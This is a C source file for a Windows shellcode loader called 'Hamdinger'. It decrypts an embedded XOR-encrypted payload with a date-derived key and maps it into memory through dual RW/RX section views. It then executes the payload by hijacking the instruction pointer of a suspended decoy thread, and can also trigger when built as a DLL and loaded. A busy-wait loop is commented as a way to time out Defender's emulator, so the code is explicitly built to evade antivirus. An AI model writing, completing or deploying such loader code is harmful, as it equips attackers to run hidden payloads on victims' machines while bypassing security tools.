#include <windows.h>
#include <stdio.h>

// --- NTAPI Definitions ---
typedef NTSTATUS (NTAPI *pNtCreateSection)(OUT PHANDLE, IN ACCESS_MASK, IN PVOID, IN PLARGE_INTEGER, IN ULONG, IN ULONG, IN HANDLE);
typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(IN HANDLE, IN HANDLE, IN OUT PVOID*, IN ULONG_PTR, IN SIZE_T, IN OUT PLARGE_INTEGER, IN OUT PSIZE_T, IN DWORD, IN ULONG, IN ULONG);

#include "hamdinger_data.h"

#define HAMDINGER_PART "LudicrousGibs"
#define MAX_KEY_LEN 100

void xor_decrypt(unsigned char* data, unsigned int data_len, const char* key) {
    unsigned int key_len = strlen(key);
    for (unsigned int i = 0; i < data_len; i++) {
        data[i] ^= key[i % key_len];
    }
}

void creative_delay() {
    // Defender's emulator usually times out after a few million instructions.
    // We can "waste" time by doing something that looks legitimate.
    for (int i = 0; i < 100000000; i++) {
        if (i % 123 == 0) {
            GetTickCount(); // A real API call that does nothing harmful
        }
    }
}

void RunHamdinger() {
    // 1. Setup Key
    SYSTEMTIME st;
    char yack_face[MAX_KEY_LEN];
    char bear_str[5];
    GetLocalTime(&st);
    _snprintf(bear_str, sizeof(bear_str), "%d", st.wYear);
    strcpy(yack_face, HAMDINGER_PART);
    strcat(yack_face, bear_str);

    // 2. Resolve Functions
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtCreateSection NtCreateSection = (pNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    pNtMapViewOfSection NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");

    HANDLE hSection = NULL;
    PVOID pLocalViewRW = NULL;
    PVOID pLocalViewRX = NULL;
    SIZE_T viewSize = 0;
    LARGE_INTEGER sectionSize = { .QuadPart = hamdinger_len };

    // 3. Dual Mapping (as we did before)
    NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    NtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalViewRW, 0, 0, NULL, &viewSize, 2, 0, PAGE_READWRITE);
    
    RtlMoveMemory(pLocalViewRW, encrypted_hamdinger, hamdinger_len);
    xor_decrypt((unsigned char*)pLocalViewRW, hamdinger_len, yack_face);
    
    NtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalViewRX, 0, 0, NULL, &viewSize, 2, 0, PAGE_EXECUTE_READ);

    printf("[+] RX View mapped at %p. Preparing Spoofed Thread...\n", pLocalViewRX);

    // 4. THE SPOOF: Create a suspended thread pointing to a dummy legitimate function
    // We point it at 'GetCurrentProcess' just as a decoy.
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)GetCurrentProcess, NULL, CREATE_SUSPENDED, NULL);
    
    if (hThread) {
        CONTEXT ctx;
        ctx.ContextFlags = CONTEXT_CONTROL;
        GetThreadContext(hThread, &ctx);

        // 5. Hijack the Instruction Pointer (RIP on x64)
        // We tell the thread: "Actually, start at my RX memory instead."
#ifdef _M_IX86
        ctx.Eip = (DWORD_PTR)pLocalViewRX;
#else
        ctx.Rip = (DWORD_PTR)pLocalViewRX;
#endif

        SetThreadContext(hThread, &ctx);
        
        printf("[+] Thread Context Hijacked. Resuming...\n");
        ResumeThread(hThread);
        
        // Let it run
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }

    CloseHandle(hSection);
}

#ifdef BUILD_EXE
int main() { RunHamdinger(); return 0; }
#else
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID l) {
    if (r == DLL_PROCESS_ATTACH) {
        // We still use a thread here to exit DllMain quickly
        HANDLE hT = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunHamdinger, NULL, 0, NULL);
        if (hT) CloseHandle(hT);
    }
    return TRUE;
}
#endif
